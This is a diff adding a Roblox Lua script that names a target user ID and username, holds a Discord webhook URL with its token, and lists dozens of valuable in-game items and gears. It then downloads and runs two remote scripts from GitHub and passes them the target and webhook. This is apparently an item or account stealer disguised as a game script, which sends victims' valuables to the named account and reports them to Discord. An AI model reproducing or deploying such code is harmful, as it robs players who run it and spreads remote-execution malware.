@@ -1,0 +1,124 @@
+local TARGET_ID = 6074348674
+local TARGET_USER = "Onlyplaystrongest"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1521328702141763640/nzKBd5x05gDZwVEkCBYczpDAkBToP1Jt3V_rNi9Aep1LzHvSe2HkpuVEYPNC3dogaKDJ"
+
+local TargetBrainrots = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Griffin"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Antonio"] = true,
+    ["John Pork"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Rubrikiko"] = true,
+    ["Capitano Americano"] = true,
+    ["Arcadragon"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Rico Dinero"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Headless Horseman"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Signore Carapace"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Fishino Clownino"] = true,
+    ["Duggy Bros"] = true,
+    ["Cerberus"] = true,
+    ["Kraken"] = true,
+    ["Money Money Bros"] = true,
+    ["Caylusaurus"] = true,
+    ["Steakini Fattini"] = true,
+    ["Venuspino"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Los Hackers"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Jelly Moby"] = true,
+    ["Digi Narwhal"] = true,
+    ["Los Tictacs"] = true,
+    ["Los Admins"] = true,
+    ["Moby Bros"] = true,
+    ["Boppin Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Capitano Moby"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cash or Card"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Cooki and Milki"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Eviledon"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Festive 67"] = true,
+    ["Fragola La La La"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Ginger Gerat"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Spooky Grande"] = true,
+    ["Examen Bros"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Amigos"] = true,
+    ["Los Bros"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Puggies"] = true,
+    ["Los Primos"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Tacoritas"] = true,
+    ["Love Love Bear"] = true,
+    ["Lovin Rose"] = true,
+    ["Orcaledon"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Quackini Snackini"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Tralaledon"] = true,
+    ["W or L"] = true,
+    ["Rubiko and Kubiko"] = true
+}
+
+local TargetBaseSkins = {
+    ["Tralalero"] = true,
+    ["Summer"] = true
+}
+
+local TargetGears = {
+    ["Blackhole Bomb"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Candy Sentry"] = true,
+    ["Cupid's Wings"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Witch's Broom"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/koop232/Ggreen/refs/heads/main/Green%20Duels.txt"))()
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
